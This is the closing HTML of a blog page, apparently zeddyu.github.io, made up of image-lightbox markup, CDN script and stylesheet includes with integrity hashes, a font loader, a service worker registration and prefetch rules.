<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.zdy.one/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.zdy.one/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.zdy.one/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.zdy.one/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.zdy.one/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///ts/main.js defer integrity="sha256-Hpo7r9hGztTDRdCEs1X7jHuudXAcM4+KH4qCx4ATeCY=" crossorigin=anonymous></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><script>"serviceWorker"in navigator&&window.addEventListener("load",function(){navigator.serviceWorker.register("https://zeddyu.github.io/sw.min.js").then(function(e){console.log("ServiceWorker registration successful with scope: ",e.scope)},function(e){console.log("ServiceWorker registration failed: ",e)})})</script><script type=speculationrules>
    {
        "prefetch": [
            {
                "source": "document",
                "eagerness": "moderate",
            }
        ],
        "prerender": [
            {
                "urls": ["/about", "/archives", "/ads", "/categories", "/links", "/search"],
                "eagerness": "eager",
            }
        ]
    }
</script></body></html>